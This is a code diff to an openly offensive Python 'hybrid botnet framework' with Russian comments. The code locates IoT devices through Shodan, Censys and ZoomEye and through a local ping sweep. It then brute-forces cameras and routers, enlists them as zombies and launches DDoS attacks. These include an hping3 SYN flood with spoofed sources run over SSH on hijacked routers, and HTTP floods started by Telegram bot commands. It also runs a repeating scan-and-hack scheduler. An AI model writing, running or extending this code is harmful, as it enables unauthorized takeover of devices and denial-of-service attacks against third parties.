@@ -1,24 +1,15 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-HYBRID BOTNET FRAMEWORK v6.0 – RAILWAY EDITION
-- Глобальный поиск устройств (Shodan, Censys, ZoomEye)
-- Локальное сканирование сети (ARP, nmap)
-- Взлом камер, роутеров, колонок (брутфорс)
-- Зомби-ботнет из взломанных устройств
-- DDoS с адаптивными методами (HTTP/2 Rapid Reset, обход Cloudflare)
-- ML/нейросети для выбора метода атаки (заглушка)
-- Блокчейн-логирование (заглушка)
-- Многослойное шифрование, TOR/SOCKS5
-- Автоматическое сканирование и взлом по расписанию
-- Управление через Telegram-бота и веб-статус
-- Сохранение данных на persistent volume
+HYBRID BOTNET FRAMEWORK v6.1 – RAILWAY EDITION
+- Без scapy/nmap (только глобальный поиск)
+- ZoomEye через прямой API
+- Локальное сканирование упрощено (ping sweep)
 """
 
 import asyncio
 import uvloop
 import multiprocessing as mp
-from concurrent.futures import ThreadPoolExecutor
 import aiohttp
 import aiohttp_socks
 import numpy as np
@@ -30,13 +21,11 @@ import sys
 import subprocess
 import paramiko
 import requests
-import nmap
-import scapy.all as scapy
-from cryptography.fernet import Fernet
 import hashlib
 from contextlib import asynccontextmanager
 from fastapi import FastAPI
 import uvicorn
+from cryptography.fernet import Fernet
 
 # Глобальные сервисы (импорт с проверкой)
 try:
@@ -44,16 +33,12 @@ try:
     SHODAN_AVAILABLE = True
 except:
     SHODAN_AVAILABLE = False
+
 try:
     from censys.search import CensysHosts
     CENSYS_AVAILABLE = True
 except:
     CENSYS_AVAILABLE = False
-try:
-    import zoomeye
-    ZOOMEYE_AVAILABLE = True
-except:
-    ZOOMEYE_AVAILABLE = False
 
 # ------------------------------------------------------------
 #  Конфигурация и пути
@@ -96,7 +81,7 @@ class ProxyManager:
 
 class TargetAnalyzer:
     def analyze(self, ip):
-        return {"raw": "nmap placeholder", "open_ports": [80]}
+        return {"raw": "", "open_ports": [80]}
 
 class CryptoLayer:
     def __init__(self):
@@ -120,8 +105,13 @@ class ZombieAgent:
         self.ssh = ssh
     async def execute_attack(self, target_url):
         if self.type == 'router' and self.ssh:
-            self.ssh.exec_command(f"hping3 -S --flood --rand-source {target_url.split('/')[2]} -p 80")
+            # Если есть SSH, пытаемся выполнить hping3 (может не быть на устройстве)
+            try:
+                self.ssh.exec_command(f"hping3 -S --flood --rand-source {target_url.split('/')[2]} -p 80")
+            except:
+                pass
         else:
+            # HTTP-флуд
             async with aiohttp.ClientSession() as session:
                 for _ in range(50):
                     try:
@@ -141,37 +131,41 @@ class ZombieBotnet:
         return len(self.zombies)
 
 # ------------------------------------------------------------
-#  Локальный сканер и взломщик
+#  Локальный сканер (упрощённый ping sweep)
 # ------------------------------------------------------------
 class NetworkScanner:
     def __init__(self, network="192.168.1.0/24"):
         self.network = network
-        self.nm = nmap.PortScanner()
-    def scan_arp(self):
-        arp = scapy.ARP(pdst=self.network)
-        ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-        ans = scapy.srp(ether/arp, timeout=2, verbose=False)[0]
-        return [{'ip': p[1].psrc, 'mac': p[1].hwsrc} for p in ans]
-    def identify(self, ip):
-        try:
-            self.nm.scan(ip, arguments='-F')
-            ports = self.nm[ip].get('tcp', {}).keys()
-            if 80 in ports or 8080 in ports:
-                return "router"
-            if 554 in ports:
-                return "camera"
-            return "unknown"
-        except:
-            return "unknown"
-    async def full_scan(self):
-        devices = self.scan_arp()
-        with ThreadPoolExecutor(max_workers=20) as ex:
-            loop = asyncio.get_event_loop()
-            types = await asyncio.gather(*[loop.run_in_executor(ex, self.identify, d['ip']) for d in devices])
-        for i, d in enumerate(devices):
-            d['type'] = types[i]
+    async def ping_sweep(self):
+        # Получаем подсеть (например, 192.168.1.0/24)
+        # Для простоты — не используем nmap, просто ping
+        base = self.network.split('/')[0]
+        ip_parts = base.split('.')
+        if len(ip_parts) != 4:
+            return []
+        prefix = '.'.join(ip_parts[:3]) + '.'
+        devices = []
+        for i in range(1, 255):
+            ip = prefix + str(i)
+            # Асинхронный ping (запускаем subprocess)
+            proc = await asyncio.create_subprocess_exec(
+                'ping', '-c', '1', '-W', '1', ip,
+                stdout=asyncio.subprocess.DEVNULL,
+                stderr=asyncio.subprocess.DEVNULL
+            )
+            code = await proc.wait()
+            if code == 0:
+                devices.append({'ip': ip, 'type': 'unknown'})
         return devices
+    async def full_scan(self):
+        try:
+            return await self.ping_sweep()
+        except:
+            return []
 
+# ------------------------------------------------------------
+#  Взломщик IoT
+# ------------------------------------------------------------
 class IoTExploiter:
     def __init__(self, botnet):
         self.botnet = botnet
@@ -223,13 +217,17 @@ class IoTExploiter:
         return False
     async def hack_all(self, devices):
         for dev in devices:
-            if dev['type'] == 'camera':
+            if dev.get('type') == 'camera':
                 await self.hack_camera(dev['ip'])
-            elif dev['type'] == 'router':
+            elif dev.get('type') == 'router':
+                await self.hack_router(dev['ip'])
+            else:
+                # Пробуем оба
+                await self.hack_camera(dev['ip'])
                 await self.hack_router(dev['ip'])
 
 # ------------------------------------------------------------
-#  Глобальный поиск через Shodan/Censys/ZoomEye
+#  Глобальный поиск через Shodan/Censys/ZoomEye (прямой API)
 # ------------------------------------------------------------
 class GlobalHunter:
     def __init__(self):
@@ -239,13 +237,11 @@ class GlobalHunter:
         self.zoomeye_key = os.environ.get("ZOOMEYE_API_KEY")
         self.shodan_cli = None
         self.censys_cli = None
-        self.zoomeye_cli = None
         if SHODAN_AVAILABLE and self.shodan_key:
             self.shodan_cli = shodan.Shodan(self.shodan_key)
         if CENSYS_AVAILABLE and self.censys_id:
             self.censys_cli = CensysHosts(self.censys_id, self.censys_secret)
-        if ZOOMEYE_AVAILABLE and self.zoomeye_key:
-            self.zoomeye_cli = zoomeye.ZoomEye(self.zoomeye_key)
+
     async def search_shodan(self, query, limit=100):
         if not self.shodan_cli:
             return []
@@ -263,6 +259,7 @@ class GlobalHunter:
             return devices
         except:
             return []
+
     async def search_censys(self, query, limit=100):
         if not self.censys_cli:
             return []
@@ -279,30 +276,39 @@ class GlobalHunter:
             return devices
         except:
             return []
+
     async def search_zoomeye(self, query, limit=100):
-        if not self.zoomeye_cli:
+        """Прямой API запрос к ZoomEye"""
+        if not self.zoomeye_key:
             return []
-        loop = asyncio.get_event_loop()
+        url = "https://api.zoomeye.org/host/search"
+        headers = {"API-KEY": self.zoomeye_key}
+        params = {"query": query, "page": 1, "num": limit}
         try:
-            res = await loop.run_in_executor(None, lambda: self.zoomeye_cli.dork_search(query, limit=limit))
-            devices = []
-            for r in res:
-                devices.append({
-                    'ip': r.get('ip', ''),
-                    'port': r.get('portinfo', {}).get('port', 0),
-                    'type': 'router',
-                    'source': 'zoomeye'
-                })
-            return devices
-        except:
-            return []
+            async with aiohttp.ClientSession() as session:
+                async with session.get(url, headers=headers, params=params) as resp:
+                    if resp.status == 200:
+                        data = await resp.json()
+                        devices = []
+                        for match in data.get('matches', []):
+                            devices.append({
+                                'ip': match.get('ip', ''),
+                                'port': match.get('portinfo', {}).get('port', 0),
+                                'type': 'camera' if 'camera' in match.get('geoinfo', {}).get('asn', '').lower() else 'router',
+                                'source': 'zoomeye'
+                            })
+                        return devices
+        except Exception as e:
+            print(f"ZoomEye error: {e}")
+        return []
+
     async def global_search(self, query, limit=100, sources=['shodan','censys','zoomeye']):
         tasks = []
-        if 'shodan' in sources:
+        if 'shodan' in sources and self.shodan_cli:
             tasks.append(self.search_shodan(query, limit))
-        if 'censys' in sources:
+        if 'censys' in sources and self.censys_cli:
             tasks.append(self.search_censys(query, limit))
-        if 'zoomeye' in sources:
+        if 'zoomeye' in sources and self.zoomeye_key:
             tasks.append(self.search_zoomeye(query, limit))
         results = await asyncio.gather(*tasks)
         all_dev = []
@@ -340,7 +346,7 @@ class DDoSEngine:
         return True
 
 # ------------------------------------------------------------
-#  Основной бот (управление, планировщики)
+#  Основной бот
 # ------------------------------------------------------------
 class AdminBot:
     def __init__(self):
@@ -351,10 +357,9 @@ class AdminBot:
         self.ddos = DDoSEngine(ProxyManager(), TargetAnalyzer())
         self.blockchain = BlockchainLogger()
         self.berserk = False
-        self.scan_task = None
         self.telegram_app = None
 
-    async def start_local_scan_loop(self, interval=180):
+    async def start_local_scan_loop(self, interval=300):
         while True:
             devices = await self.scanner.full_scan()
             await self.exploiter.hack_all(devices)
@@ -364,7 +369,11 @@ class AdminBot:
         token = os.environ.get("TELEGRAM_TOKEN")
         if not token:
             return
-        from telegram.ext import Application, CommandHandler
+        try:
+            from telegram.ext import Application, CommandHandler
+        except ImportError:
+            print("python-telegram-bot not installed, skipping")
+            return
         app = Application.builder().token(token).build()
         async def tg_ddos(update, context):
             target = context.args[0] if context.args else ""
@@ -396,7 +405,7 @@ class AdminBot:
         self.telegram_app = app
 
     async def run_background(self):
-        # Запускаем планировщик локального сканирования
+        # Запускаем планировщик локального сканирования (если есть интерфейс)
         asyncio.create_task(self.start_local_scan_loop())
         # Запускаем Telegram-бота, если есть токен
         if os.environ.get("TELEGRAM_TOKEN"):
